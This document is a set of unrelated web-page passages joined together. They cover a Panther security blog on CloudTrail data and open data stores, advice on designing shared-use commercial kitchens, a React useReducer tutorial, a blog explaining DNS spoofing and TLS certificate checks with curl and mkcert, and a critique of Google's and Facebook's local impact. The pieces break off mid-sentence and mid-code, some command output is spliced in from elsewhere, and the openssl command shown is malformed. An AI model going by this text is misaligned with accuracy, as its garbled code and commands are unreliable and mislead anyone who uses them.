        "type": "IAMUser",
        "principalId": "EX_PRINCIPAL_ID",
        "arn": "arn:aws:iam::123456789012:user/Alice",
        "accessKeyId": "EXAMPLE_KEY_ID",
        "accountId": "123456789012",
        "userName": "Alice"
      },
      "eventTime": "2014-03-06T21:22:54Z",
      "eventSource": "ec2.amazonaws.com",
      "eventName": "StartInstances",
      "awsRegion": "us-east-2",
      "sourceIPAddress": "205.251.233.176",
      "userAgent": "ec2-api-tools 1.6.12.2"
    }
  ]
}</code></pre><p>In particular, take note of the complex <em>userIdentity</em> attribute which is very useful for answering security questions concerning “who” was responsible for an activity. <strong>A security application database needs to be able to represent such data and allow efficient searching and element extraction</strong>.</p><h2 id="making-a-decision">Making a Decision</h2><p>Given the important qualities we require for a database, Panther chose to initially support two options which may be used interchangeably in the backend: <a href="https://docs.aws.amazon.com/athena/latest/ug/what-is.html">AWS Athena</a> and <a href="https://www.snowflake.com/">Snowflake</a>. </p><p><strong>Security products commonly keep their choice of database engine proprietary and hidden from users</strong> (but if you ask, most use Elasticsearch which is neither serverless, nor does it separate storage from compute). Customer interaction with data only happens using the product’s UI or APIs, which allows vendors to:</p><ul><li>Change datastores and internal representations without impacting customers.</li><li>Abstract the underlying technology which might be proprietary and offer competitive advantages.</li></ul><p><strong>Panther decided not to follow this path.</strong></p><p>As an open security product, it was important to us that customers always had the ability to customize our platform to fit their needs and integrate with other systems. Let’s dig deeper into why opening up our data infrastructure has such a valuable impact on the usability of our system.</p><h3 id="enriching-security-data-with-business-context">Enriching Security Data with Business Context</h3><p>Allowing customer access to Panther’s database improves overall security. </p><p>Providing relevant context for security analytics is the key to successfully utilizing security data. For example, the normal behavior of a salesperson is very different from a system administrator. Distinguishing the activity of a salesperson from a system administrator could be important if the activity involved the salesperson logging into production servers (very suspicious!). </p><p>A customer typically has internal mappings (e.g., Active Directory data) to label a user id as a salesperson or a system administrator for business reasons. By exposing the core database, customers can join their internal data (which has the user’s job role) to the security data (which likely only has &nbsp;the user’s id) to provide the needed context to disposition events.</p><p>While contextualizing security data with customer business data makes the data more relevant, the compliment is also true. Processed security data can add value to core business analytics by supplying information about user activity and cloud infrastructure to improve efficiency and reduce costs.</p><h3 id="open-integrations-and-partner-ecosystems">Open Integrations and Partner Ecosystems</h3><p>Panther has a beautiful user interface that makes it easy for security teams to customize detections, triage alerts, baseline behaviors, and investigate incidents. However, our customers often need to answer very particular questions about their security posture and infrastructure that is outside the scope of what we offer in our UI today. Exposing the datastore allows customers to use their existing business intelligence (BI) tools without any special integrations.This allows customers to create their own rich graphs, metrics, and reports to communicate to stakeholders the state of the organization’s security posture. </p><p>In addition, some teams also have significant investments in existing data processing technologies. Rather than forcing them to replace a datastore, using a shared datastore enables easy integration. Notebooks are particularly popular for Security Engineers to implement customized threat hunting. For example, see: <a href="https://posts.specterops.io/threat-hunting-with-jupyter-notebooks-part-1-your-first-notebook-9a99a781fde7">“Threat Hunting with Jupyter Notebooks— Part 1: Your First Notebook”</a>. Customers can integrate <a href="https://jupyter.org/">Jupyter </a>and <a href="https://zeppelin.apache.org/">Zeppelin</a> notebooks as well as <a href="https://spark.apache.org/">Spark </a>systems with Panther data by using the AWS Glue catalog, and there are ways to easily <a href="https://www.snowflake.com/blog/quickstart-guide-for-sagemaker-snowflake-part-one/">connect Snowflake as well</a>. </p><p>It is also very common to have in-house security workflows that are very particular to the customer’s business and data. These must (by definition) be implemented <em>by the customer</em>. Having easy access to the common datastore allows these workflows to query back into the database to retrieve critical data. An example of this is a mitigation workflow that is triggered by a Panther alert of suspicious activity. The workflow reaches back into the datastore to collect data identifying the employee and circumstances from <strong>both </strong>the processed security data and the business-related data. Using this information, the mitigation then restricts access accordingly (e.g., using the SSO API to revoke an access token) and notifies the employee’s manager and the security organization.

<p><span>The shared-kitchen industry is growing, even in such a tough year. People are more focused on local supply chains and community togetherness, while our increasingly digital world is demanding new ways of working in the food industry. Many chefs and caterers are realising that the solution to their problems might be just around the corner in a shared-use kitchen.</span></p>
<p><span>If you already realized this and want to provide a space for innovation and creativity in your local area, you might be asking: how does one go about planning a new kitchen space? Or reinvent an existing kitchen for shared commercial use?</span></p>
<p><b>It’s a daunting prospect and you’re right to look for some outside help!</b></p>
<p><span>Here’s the thing. If you don’t get the design right in the early stages, things are likely to get very costly down the road. You don’t want to get your shiny kitchen built, only to be told by the health department that you need to dig up the floor to put in a floor sink, for example. Or if you don’t plan for enough electrical capacity to simultaneously run walk-in refrigerators, fryers, combination ovens, vent hoods, and dishwashers, you may not be able to to support multiple tenants at all.&nbsp;</span></p>
<p><span>Proper planning and upfront investment in a design from the professionals will help you avoid issues like this and avert a financial disaster. There’s a multitude of details that must be thought-out carefully to avoid issues down the road.</span></p>
<h2><span>What to Consider When Designing a Shared-use Kitchen</span></h2>
<p><a href="https://atkdesignstudios.com/"><span>ATK Design Studios</span></a><span> has decades of experience designing commercial kitchens, including university cafeterias, corporate coffee bars, cafes, and markets, senior care facilities, government cafeteria kitchens, and more.</span></p>
<p><span>The businesses’ owner and Senior Principal Teri Kidwell explains that designing shared-use kitchens is a natural fit based on the firm’s experience. Referring to commercial kitchens of the type mentioned above, she says, “Those </span><i><span>are</span></i><span> shared kitchens because there’s a lot of people working in one space to serve a mass of people.”&nbsp;</span></p>
<p><span>That’s why the team has put together a special package to help you navigate the inevitable challenges you’ll encounter when planning and building a shared-use kitchen. Teri and Head of Business Development Marisela Smith put their heads together and told us the most important factors to consider from their years of experience.&nbsp;</span></p>
<p><span>There was a lot of talk about floor sinks and health and safety regulations, and here’s the list of considerations they came up with.</span></p>
<h3><span>Define the Goals of Your Shared Kitchen</span></h3>
<p><span>The first stage of kitchen design planning is to decide what you want for your kitchen. The constraining factors will be your budget and, if you already have a site in mind, the size of your space.</span></p>
<p><span>But the first step is to ask yourself if you could have whatever you wanted, what would it be? More specifically:</span></p>
<ul>
<li><span>What do you want to achieve with your kitchen?&nbsp;</span></li>
<li><span>Who is it for?</span></li>
<li><span>What kind of equipment and amenities do you want to provide? For example, will you have bakery equipment, an event space, parking for food trucks etc.?</span></li>
<li><span>How many tenants will you accommodate?</span></li>
</ul>
<p><span>Working with a design firm that understands what goes into designing and building out a professional kitchen will help you whittle down your ideas and ambitions to a realistic list. Inevitably, there will be compromises so it’s important to fully answer these questions before you spend any money on construction or equipment.</span></p>

<h3><span>Set a Working Budget</span></h3>
<p><span>What is your budget based on your goals and what you can realistically afford?</span></p>
<p><span>This may evolve and change as you look at the rest of the options so it’s something to bear in mind constantly as you go. But defining a working budget early on is important as things can quickly get out of control if you’re not on top of what you’re spending.</span></p>
<p><span>People often underestimate the cost of design and construction. So it is advisable to build in a contingency of at least 10%-20% for unforeseen costs.&nbsp;</span></p>
<p><span>If you are getting investment, you need an idea to take to an investor. A kitchen design company can help you work out a realistic budget and present a visible proposal to investors.</span></p>
<h3><span>Look at Your Existing Infrastructure</span></h3>
<p><span>Consider the buildings you’re looking at or have already purchased or leased. Ask yourself:</span></p>
<ul>
<li><span>Will the space work with your goals?&nbsp;</span></li>
<li><span>Are there existing features you can incorporate in the design, or is it a blank slate?</span></li>
<li><span>Are there any issues with building regulations?</span></li>
<li><span>Does the facility have a strong foundation, adequate plumbing and electrical systems?</span></li>
<li><span>What can you realistically achieve based on the space you have?</span></li>
</ul>
<p><span>Prioritize the equipment and facilities you need to achieve your goals. And determine what has to be compromised on.</span></p>

<h3><span>Access, Entrances, and Exits</span></h3>
<p><span>In shared kitchens access is even more important than in many other commercial kitchens as there will be multiple independent parties coming and going at all times of the day and night.</span></p>
<p><span>You need to consider:</span></p>
<ul>
<li><span>How will delivery drivers access the building?&nbsp;</span></li>
<li><span>Who will be coming and going?&nbsp;</span></li>
<li><span>Do you need an access elevator or other loading equipment?&nbsp;</span></li>
<li><span>How much parking space do you have available?</span></li>
<li><span>Can you get the required kitchen equipment into the space?</span></li>
<li><span>How will you comply with safety and fire regulations for exits?</span></li>
</ul>
<h3><span>Planning the Layout of Your Kitchen</span></h3>
<p><span>Taking into account the goals of your business, your budget, the existing infrastructure and the access issues we have already talked about, it is now time to start planning the space in more detail.</span></p>
<p><span>Professional kitchen designers will be able to advise you on the following questions:</span></p>
<ul>
<li><span>What equipment do you need and where will it go?</span></li>
<li><span>Does the health department require a hood?</span></li>
<li><span>Where do you require mandated features like a grease traps/floor sinks etc.?</span></li>
<li><span>Where will all of this go?&nbsp;</span></li>
<li><span>What is the best layout for your customers’ needs and their business flows?</span></li>
</ul>
<p><span>The layout of the kitchen is particularly important in a shared space where multiple people and organisations will be using the space and the equipment. Consider how customers will move to and from shared refrigerators, dry storage rooms, and break rooms. Everything must have its place. And you want to make sure this makes sense and is a logical layout so that the space functions well and you avoid bottlenecks.</span></p>

<h3><span>Building Regulations and Health and Safety Considerations</span></h3>
<p><span>Once you have your rough design, check that you are complying with all the relevant building regulations, safety requirements, and certifications and you will get the relevant licenses required.</span></p>
<p><span>Being aware of these rules and regulations well in advance of building and fitting out your kitchen is vital. Because the last thing you want is to finish the build and then be prevented from opening because you don’t have the required hood vent, handwashing sink, or other mandated features.</span></p>
<h3><span>Visualizing Your Kitchen</span></h3>
<p><span>Now you really imagine how the space will work. You can make changes and adjustments to fine-tune the design. A design company can produce an accurate visualization of the kitchen space so that you can see in advance what it will look like. This allows you to really imagine working in the space and tweak the layout to make it as efficient and user-friendly as possible.</span></p>

<p><span>It might also be a good idea to share the design with potential clients or industry professionals and get their expert opinions. A visualization makes this process a whole lot easier and better than if you were showing a scribble on the back of a napkin.</span></p>
<h2><span>How ATK Design Studios Helped Create a Shared Community Kitchen</span></h2>
<p><a href="https://sprezzaturapgh.com/"><span>Sprezzatura</span></a><span> is a Pittsburgh catering company run by Jenn Saffron, a community-focused Italian-American chef. Jenn was running a successful catering business from shared kitchens and wanted to expand into a space of her own.</span></p>
<p><img src="https://www.thefoodcorridor.com/wp-content/uploads/2020/07/ATK_LOGO_FINAL_COLOR_STACKED-2-inch.jpg" alt="" width="600" height="670" srcset="https://www.thefoodcorridor.com/wp-content/uploads/2020/07/ATK_LOGO_FINAL_COLOR_STACKED-2-inch.jpg 600w, https://www.thefoodcorridor.com/wp-content/uploads/2020/07/ATK_LOGO_FINAL_COLOR_STACKED-2-inch-269x300.jpg 269w" sizes="(max-width: 600px) 100vw, 600px" data-old-src="https://www.thefoodcorridor.com/wp-content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.thefoodcorridor.com/wp-content/uploads/2020/07/ATK_LOGO_FINAL_COLOR_STACKED-2-inch.jpg"></p>
<p><span>ATK Design Studios helped both <a href="https://sprezzaturapgh.com/">Sprezzatura</a> and <a href="https://412foodrescue.org/">412 Food Rescue</a>&nbsp;in the collaboration and development of a shared-use space. 412 Food Rescue is a non-profit organization that facilities the recycling of surplus food from local grocery stores, restaurants and cafes, putting it to use and getting it into the hands of people who need it most. Both had their own visions and are their own individual entities. The space was envisioned to bring the two organizations together, but our design also allowed them to work independently.</span></p>
<p><span>The space was envisioned to bring together the two organizations so that they could work together to make the most of the donated ingredients. But it would also allow them to work independently.</span></p>
<p><span>Teri explains that the space would help Food Rescue make the most of the donations that they previously didn’t have the capacity to use. ”They can’t use a whole pallet of bananas.” She says, “But you still don’t want to throw that in the trash. They wanted to be able to take it to a place where they could process it. So they could make it into banana bread or dehydrated banana chips to sell.”</span></p>
<p><span>Working with a for-profit catering company selling to the public in the same kitchen as volunteers who might not be used to the rules and etiquette of a professional space was a particular challenge that many shared kitchen operators may be able to relate to. Especially in the dish room!</span></p>
<p><span>The solution they came up with was to split the kitchen down the middle and create two production lines back to back. This enables both organizations to work at the same time and share resources and ingredients without getting in each other’s way.</span></p>
<p><span>Once the initial design was finished and tested, the storage areas were separated to optimize operations for both parties. This is a good example of adapting to make the best of the space. In the kitchen though, the team knew that the hood had to be shared as it’s an expensive piece of equipment.</span></p>
<p><span>Marisela explains, “That couldn’t have changed because the shared kitchen space was planned around the shared hood. We had to figure out how to get the most out of a very costly piece of equipment to maximize efficiency and cost-effectiveness.”</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_70_ad5"><div><p>Building upon our React hooks introduction from our previous post on <a aria-label="undefined (opens in a new tab)" href="https://www.wisdomgeek.com/development/web-development/react/react-hooks-and-local-storage-lets-build-a-todo-app/" target="_blank" rel="noreferrer noopener">understanding React hooks (useState and useEffect)</a>, we will look at the useReducer hook in this post. useReducer hook can be an alternative to useState (in fact, useState uses useReducer internally). Before getting into how to use the useReducer hook, we should understand what is meant by a reducer.</p><h2>What is a reducer?</h2><p>If you are coming from a redux background, you can probably skip this section. But for those who are not, let us first understand what a reducer is and what is the need for it. Then we will dive into the useReducer hook.</p><p><span>- Advertisement -</span> <ins data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-1198872678846288" data-ad-slot="2989761355"></ins> </p><p>The first principle that we should remember before getting into a reducer is that the state is represented as a single immutable tree. So whenever we make a change to state, it is an explicit change. Typically, we use the setState function to make changes to the state. When using redux, we will not be making these changes directly to the state. We will instead be using reducers, which are functions that determine how to change the application state. For making changes to the application state, we will call these reducers with an action to specify what happened.</p><p>Let us consider a simple counter example:</p><pre><code>function Counter({initialCount}) {
  const [count, setCount] = useState(initialCount);
  return (
    &lt;&gt;
      Count: {count}
      &lt;button onClick={() =&gt; setCount(initialCount)}&gt;Reset&lt;/button&gt;
      &lt;button onClick={() =&gt; setCount(prevCount =&gt; prevCount - 1)}&gt;-&lt;/button&gt;
      &lt;button onClick={() =&gt; setCount(prevCount =&gt; prevCount + 1)}&gt;+&lt;/button&gt;
    &lt;/&gt;
  );
}</code></pre><p>There are two actions that are happening here: increment and decrement. So we can abstract them out into a reducer function that takes an action as an argument:</p><pre><code>function reducer(count, action) {
  switch (action) {
    case 'increment':
      return count + 1;
    case 'decrement':
      return count - 1;
  }
}</code></pre><p>An action is the minimal representation of the change to application data (or state).</p><h2>Why do we need reducers?</h2><p>The first question that comes to mind is, why do we need reducers or actions? Even though it is redundant in our counter example, but for larger applications, there can be a lot of state-related operations happening everywhere. So, instead of having these spread out all across our application, and inside different components, we move it all into a reducer function. The reducer function then becomes a single source of truth for all application state-related changes. Thus a reducer takes in two arguments, state, and action, and returns the new state of the application.</p><pre><code>(state, action) =&gt; newState</code></pre><p>And all the different actions across the application are now in a single place, and the reducer function updates state according to the action it receives. The reducer is also a pure function, that is it does not have any side-effects.</p><p>Overall, all these properties of the reducer function make it perfect for testing state changes independently and in isolation. The same input should always return the same output.</p><h2>The action in a reducer function</h2><p>Even though we touched on the action above, it was a simplified version of what action looks like. Sometimes, we want to pass in a value along with the action as well. If we were to increment by 5 instead of 1, our previous example would require a different action altogether.</p><p>Instead, a standard has been laid out for actions. The only requirement is that the action is an object that has a type property defining what the action is. Also, the value of the type property should not be undefined. It can be an object as well, but the best practice is to use a string because strings are serializable. Any additional information can be passed in as different properties.</p><p>Putting all of this together, our updated reducer would now look like:</p><pre><code>const initialState = {count: 0};

function countReducer(state, action) {
  switch (action.type) {
    case 'increment':
      return {count: state.count + 1};
    case 'decrement':
      return {count: state.count - 1};
    default:
      throw new Error();
  }
}
const newState = countReducer(initialState, 'increment') // returns {count: 1}
countReducer(newState , 'decrement') // returns {count: 0}</code></pre><p>With all this in place, the component does not need to know anything about updating the state. All the components need to know is that they will dispatch an action with the type of what happened, and the reducer will take care of everything else. Thus we achieve more maintainable code that adheres to the single responsibility principle.</p><h2>React’s useReducer hook</h2><p>Now that we have an understanding of reducer functions, we can dive into the useReducer hook implementation. As we have already seen, the useReducer hook is useful for managing complex state and state transitions.</p><p>Another benefit of the reducer is to not have to pass props manually around from parent components to child components. This is possible because all the state-related logic is defined inside the reducer function. And the child component only needs to call the reducer function with the appropriate action.</p><p>Before we start using the useReducer hook, we need to have the reducer defined. We already did that above for our counter example. Next, we can reduce the useState call with useReducer and pass the reducer to it and the initial state that we want to assign.</p><pre><code>const initialState = {count: 0};
const [state, dispatch] = useReducer(reducer, initialState);</code></pre><p>Like useState, useReducer returns an array of two variables. The first one refers to the current state of the application, and the second is a dispatch function that we can use to send actions to the reducer. Invoking the dispatch function would change the state of the application, depending on the action that we invoke it with. Thus our counter example would get converted into the following code using the useReducer hook:</p><pre><code>const initialState = {count: 0};

function reducer(state, action) {
  switch (action.type) {
    case 'increment':
      return {count: state.count + 1};
    case 'decrement':
      return {count: state.count - 1};
    case 'reset':
      return initialState;
    default:
      throw new Error();
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, initialState);
  return (
    &lt;&gt;
      Count: {state.count}
      &lt;button onClick={() =&gt; dispatch({type: 'reset'})}&gt;Reset&lt;/button&gt;
      &lt;button onClick={() =&gt; dispatch({type: 'decrement'})}&gt;-&lt;/button&gt;
      &lt;button onClick={() =&gt; dispatch({type: 'increment'})}&gt;+&lt;/button&gt;
    &lt;/&gt;
  );
}</code></pre><p>It is also important to note that React guarantees that the calls to the dispatch function are stable and will not change on re-renders. Therefore we do not need to put it in the useEffect dependency list.</p><h2>Applying useReducer hook to our To-Do list application</h2><p>Let us now apply the hook to our ToDo list application that we had built in the previous blog post.</p><p>We will define an items reducer as follows:</p><pre><code>const itemsReducer = (state, action) =&gt; {
  switch (action.type) {
    case 'POPULATE_ITEMS':
      return action.items;
    case 'ADD_ITEM':
      return [...state, action.item];
    case 'REMOVE_ITEM':
      return state.filter((item) =&gt; item !== action.itemToBeDeleted);
    default:
      return state;
  }
};</code></pre><p>The three actions correspond to fetching of data, adding an item, and removing an item. These are self-explanatory in what we are trying to do here with respect to the action type that we receive. Next, we will start making use of this reducer in our App component. We will replace useState with our useReducer hook</p><pre><code>const [items, itemsDispatch] = useReducer(itemsReducer, []);</code></pre><p>We can name the first (state) variable whatever we want it to be. It is better to be more explicit about what it refers o since there might be multiple reducers in an application. So we did not name it state as we did in our example before.</p><p>Now that we have access to our state variable and dispatch function, we can use them in our component. Getting into our first useEffect call:</p><pre><code>  useEffect(() =&gt; {
    const items = JSON.parse(localStorage.getItem('items'));
    if (items) {
      setItems(items);
    }
  }, []);</code></pre><p>We no longer have access to setItems. But we created an action POPULATE_ITEMS in our reducer to populate the items which can be used here. So we will invoke our dispatch function here instead:</p><pre><code>useEffect(() =&gt; {
  const items = JSON.parse(localStorage.getItem('items'));
  if (items) {
    itemsDispatch({ type: 'POPULATE_ITEMS', items });
  }
}, []);</code></pre><p>When we invoke this dispatch function, it will invoke our reducer with action type POPULATE_ITEMS. And since we passed in the items (using the shorthand notation), the items reducer returns those items and saves them in the application state.</p><p>For the other useEffect where we were saving items to state, we do not need to do anything since we were not doing any state manipulation.</p><p>Next, we will do the same thing for the other actions that we have, that is adding an item and removing an item.</p><pre><code>const addItem = (item) =&gt; {
  // setItems([...items, item]);
  // becomes:
  itemsDispatch({ type: 'ADD_ITEM', item });
}

const removeItem = (itemToBeDeleted) =&gt; {
    // setItems(items.filter((item) =&gt; itemToBeDeleted !== item));
    // becomes

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Two machines on the internet can talk to each other iff both of them know each other’s IP addresses. When we
type in “google.com” in the browser, the first task of the browser is to get the IP address of “google.com”
which it does by communicating with the DNS system. Once an IP address is received, the browser establishes a
TCP connection to the server, does a TLS handshake, exchanges data with the server before terminating the
connection.</p><p>What would happen if the DNS system gives a bad IP for a domain? That is, rather than giving <code>172.217.164.206</code>
for <code>google.com</code>, DNS answers with some other IP. How can that happen? Apart from a bug in the DNS resolvers,
there can be cases where a malicious user might eavesdrop for DNS queries from your system and replies back with
IP address over which she commands control and thereafter can snoop on the traffic from your machine.</p><p>To check out this scenario, let’s try to connect to <code>google.com</code> with an IP address of <code>example.com</code> such that
TCP and TLS handshake is done with <code>example.com</code>. There are multiple ways to do this: update your local
<code>/private/etc/hosts</code> to direct <code>google.com</code> to <code>example.com</code>, inject the bad RR in locally running DNS resolver
<a href="https://github.com/lafolle/rrdns">rrdns</a> or much simpler, use curl’s <code>--resolve</code> option.</p><p>Let’s go with the 3rd option.</p><p>We can create a small HTTPS server using SSL certs signed by our own root CA using
<a href="https://github.com/FiloSottile/mkcert">mkcert</a>:</p><pre><code>$ mkcert example.com
Using the local CA at "/Users/Karan/Library/Application Support/mkcert" ✨

Created a new certificate valid for the following names 📜
 - "example.com"

The certificate is at "./example.com.pem" and the key at "./example.com-key.pem" ✅
</code></pre><p>Server code would execute the following line to
run TLS server given SSL certificate and private key:</p><div><pre><code data-lang="Go">http.<span>ListenAndServeTLS</span>(<span>":443"</span>,
	<span>"example.com.pem"</span>, <span>// Certificate.
</span><span></span>	<span>"example.com-key.pem"</span>, <span>nil</span>) <span>// Private key.
</span></code></pre></div><p>Check if the server is running correctly:</p><div><pre><code data-lang="bash">curl <span>\
</span><span></span>	--cacert rootCA.pem <span>\ </span><span># Load the root cert from this path</span>
	--resolve example.com:443:127.0.0.1  <span>\ </span><span># Use this mapping instead of asking DNS resolver</span>
	-vvv <span>\
</span><span></span>	https://example.com
</code></pre></div><p>Now lets resolve <code>google.com</code> to 127.0.0.1 and hit our test server:</p><div><pre><code data-lang="bash">curl <span>\
</span><span></span>	--cacert rootCA.pem <span>\

learn more about this situation and how to fix it, please visit the web page mentioned above. 
</code></pre></td></tr></tbody></table></div></div><p>We can see here that curl loaded its DNS cache with our entry, tries and succeeds to establish a TCP connection
with localhost:443, loads the root certs from the custom path provided and then goes ahead to establish TLS 1.3
connection with the server, which fails because of <em>no alternative certificate subject name matches target host
name ‘google.com’</em>.</p><p>What’s happening?</p><p>Every web server needs to prove its identity to the connecting client, failure of which would result in the
client terminating the connection. The entity of proof is a digital certificate that a web server offers to the
client, which on reception of cert runs multiple validations. Who certifies the server? Server gets its
certification from Certificate Authority (CA), a third party neutral organization whose job is to verify that
the server/org does own the domain for which it is asking the certificate for.</p><p>Server or domain administrator, generates a public/private RSA key pair and composes Certificate Signing Request
(CSR) containing the public key and name of domains for which it intends to get a certificate for, signs it with
the private key and sends it (CSR) to CA. CA verifies the CSR using the public key in it and also verifies if
the domains for which the certificate is requested for, does actually belong to the requesting
org/server/entity: earlier there used to be manual steps involved, like asking the domain controller to update
DNS records temporarily which can assert the claim of ownership but lately the verification can be automated
using <a href="https://tools.ietf.org/html/rfc8555">ACME</a> protocol by LetsEncrypt. Once verification succeeds, CA
generates the X.509 certificate containing the public key of the requesting org, for how long the certificate is
valid, identity of self as to who generated the certificate, list of domains this certificate is valid for in CN
(Common Name) and SAN (Subject Alternate Name) fields and other various fields.</p><p>Note from the section above, the certificate is only valid for a selected list of domains. When client a made a
connection with the server, the server sent back its certificate to affirm its identity. Apart from many other
validations (like is the certificate signed by a verified CA, is the cert expired or not, etc) the client also
checks if the domain name to which it was trying to connect to matches the CN (Common Name) or SAN (Subject
Alternate Name) present in the certificate. This is the stuff that failed in our case as neither CN nor SAN in
certificate matches <code>google.com</code>. What are they in the certificate? CN is set to “mkcert
@.local ()” and SAN consists of DNS name=example.com and IP Address =
127.0.0.1. Both of these were set by the <code>mkcert</code> command for us.</p><p>Cool, so we now know why the failure occured. But what if we generate the certificate where SAN matches
<code>google.com</code>?</p><p>Lets generate cert for google.com: <code>mkcert google.com</code>, and load them into the server such that server looks
like this:</p><div><pre><code data-lang="Go">http.<span>ListenAndServeTLS</span>(<span>":443"</span>,
	<span>"google.com.pem"</span>, <span>// Certificate.
</span><span></span>	<span>"google.com-key.pem"</span>, <span>nil</span>) <span>// Private key.

</code></pre></td></tr></tbody></table></div></div><p>This is expected. The certificate does have <code>google.com</code> in it under SAN (<code>subjectAltName</code>) section which
matches domain present in the request.</p><p>One big advantage we have over an attacker is that we are able to inject CA’s root certificates into the client.
Note the “–cacert” option passed to <code>curl</code> which tells <code>curl</code> where to find the root CA certificate which was
used to issue X.509 cert to server. This ability is denied to attackers. Mostly clients come bundled with CA
certs and can also be provisioned to use CA certs installed in the system.</p><p>Is it possible for an attacker to use <code>google.com</code>s certificate as anyways it is public?</p><p>How can we get the SSL cert for <code>google.com</code> in PEM format??? Easy:</p><div><pre><code data-lang="bash"><span>echo</span> | openssl s_connect -showcerts -connect google.com.443 <span>\
</span><span></span>	openssl x509 -out google.com-original.pem
</code></pre></div><p>This will create a file <code>google.com-original.pem</code> that will contain the digital certificate for <code>google.com</code>.
We can load this into our server, but there is a problem. We don’t have the private key. Note, at the time of
building CSR request we need to generate public/private key pair and the private key is used to sign the
request. In fact, if we can have the corresponding private key, Google’s existence is literally doomed.</p><p>This is a blocker but lets go forward and try to feed-in wrong private key to the Go server:</p><div><pre><code data-lang="Go">http.<span>ListenAndServeTLS</span>(<span>":443"</span>,
	<span>"google.com-original.pem"</span>, <span>// Certificate.
</span><span></span>	<span>"bad-key.pem"</span>, <span>nil</span>) <span>// Private key.
</span></code></pre></div><p>On running, the server fails with following error:</p><div><pre><code data-lang="bash">2020/08/24 17:42:44 ListenAndServe: tls: private key does not match public key
<span>exit</span> status <span>1</span>
</code></pre></div><p>Of course! When the server loads the cert and private key, it generates corresponding public key from private
key and matches it against the provided public key in first argument. This matching failed here, hence the
error. Now we are certain that attacker cannot do any damage unless they have the private key corresponding to
the public key.</p><p>If the imposter is somehow able to direct the browser to her IP which is backed by a webserver also controlled
by her, until the website is being accessed by HTTPS, she won’t be able to do any harm because the whole
certificate dance prevents her from faking the identity. But it is important to note that this only works if the
website is being accessed over HTTPS. In case the website is accessed over HTTP, there is no way for the
client to verify the identity of server it is communicating with and is easy for the attacker to fake its
identity. For example, she might direct <code>scotiabank.com</code> (a major bank in Canada) to her own malicious version
of the bank’s website and ignorant user won’t be able to differentiate and might end up giving private info to
the attacker, if the servers running the site were operating over HTTP.</p><p>Though browsers are not unaware of such attack vectors and can take steps to inform the user about such
insecurity. For example, in Firefox, accessing a website over HTTP, <code>http://www.bccancer.bc.ca/</code> (some sites
do a redirection from 80 -&gt; 443) will result in indication on the url bar highlighting that communication with</p></div></div>

  <div>
    <div>
      <div>
        <p>Since 2016, commentators across a swath of disciplines have pointed to Google and Facebook as consequential and harmful actors in the global political and social order. These platforms influence world events by doing everything from disseminating fake news during national elections<a href="#_ftn1" name="_ftnref1">[1]</a> and a pandemic in the U.S. and abroad<a href="#_ftn2" name="_ftnref2">[2]</a>, to helping hate groups form and organize<a href="#_ftn3" name="_ftnref3">[3]</a>, to aiding in the fomenting of genocide in Myanmar. <a href="#_ftn4" name="_ftnref4">[4]</a></p>
<p>One area often missing from the discussion, though, is the corporations’ impact on local communities, both through their products oriented to organize local social and economic life and their corporate strategies around taxation.</p>
<p>Yet local strategies are core to both platforms, and while policy can be done at a national level, life is lived locally. The shops, businesses, public spaces, schools, and people around us make up our neighborhoods, and the taxes we pay support our communities.</p>
<p>Indeed, Google and Facebook know this, and portray themselves as organizers of local communities, helping connect people to the small businesses and neighbors around them. “One of the biggest opportunities is to help small businesses create connections with customers in their local neighborhoods and beyond,” Google CEO Sundar Pichai wrote in October 2019. “While the internet has given people the ability to buy anything from anywhere, often they are searching for what’s right next to them: the closest pediatrician, the best pizza delivery in Omaha, a hair salon open today.”<a href="#_ftn5" name="_ftnref5">[5]</a> Pichai said this is especially true during the coronavirus pandemic: “Definitely we see activity back around people trying to find services, what’s around, what’s open. People are exploring and discovering local services again.”<a href="#_ftn6" name="_ftnref6">[6]</a></p>
<p>Similarly, Facebook CEO Mark Zuckerberg has touted himself as a “community builder,” likening Facebook groups to “churches, sports teams, unions or other local groups.”<a href="#_ftn7" name="_ftnref7">[7]</a> Through 2017, Zuckerberg had discussed “community” 150 times in public<a href="#_ftn8" name="_ftnref8">[8]</a>: “Meeting new people, getting exposed to new perspectives, making it so that the communities that you join online can translate to the physical world, too,” is a Facebook goal, he said.<a href="#_ftn9" name="_ftnref9">[9]</a> On calls with investors, Facebook COO Sheryl Sandberg routinely talks up the importance of Facebook for small and local businesses. As Zuckerberg once indelicately put it, “A squirrel dying in front of your house may be more relevant to your interests right now than people dying in Africa.”<a href="#_ftn10" name="_ftnref10">[10]</a></p>
<p>And yet, when looking for local news or community information on social media, you don’t necessarily get the most trusted or professional sources, or those from traditional community stakeholders such as newspaper editors, local business, unions, or religious leaders — you get what Facebook wants you to see. When you run a Google search to find a local restaurant, you don’t necessarily get the best or most useful information — you get what Google wants you to see. When attempting to access information about where your local government is spending local resources or what it is charging for utilities, you often can’t get the full picture, only a snippet that Facebook and Google will allow. And when paying your local taxes to support your community, you may not realize the money is often going to subsidize the businesses of Google and Facebook through tax concessions hidden via shell corporations.</p>
<blockquote><p>The net effect undermines the ability of locals to access good information; instead, the vacuum is filled by commentary and conspiracies.</p></blockquote>
<p>For instance, in Holyoke, Massachusetts, the loss of several local papers resulted in the town having just one newsweekly that does no investigative reporting. When a ballot initiative in 2019 that would have OK’d a bond issue for two new middle schools was put forward, commenters in a local Facebook group spread misinformation about the city’s finances, such as who would be responsible for any potential cost overruns on the project. Targeted advertisements against the initiative were run by a committee<a href="#_ftn11" name="_ftnref11">[11]</a> whose largest funder was the local mall, the largest taxpayer in the city.<a href="#_ftn12" name="_ftnref12">[12]</a> The ballot issue was ultimately defeated.<a href="#_ftn13" name="_ftnref13">[13]</a></p>
<p>Regardless of the merits of the measure, a dedicated local news outlet would at least have been able to provide accurate information regarding the state of the city’s finances and its ability to cover the cost of the schools. Instead, as one city employee put it, local government officials wound up “playing whack a mole with every little conspiracy theory out there.”<a href="#_ftn14" name="_ftnref14">[14]</a> The city simply wasn’t equipped to run a propaganda campaign on behalf of funding schools.</p>
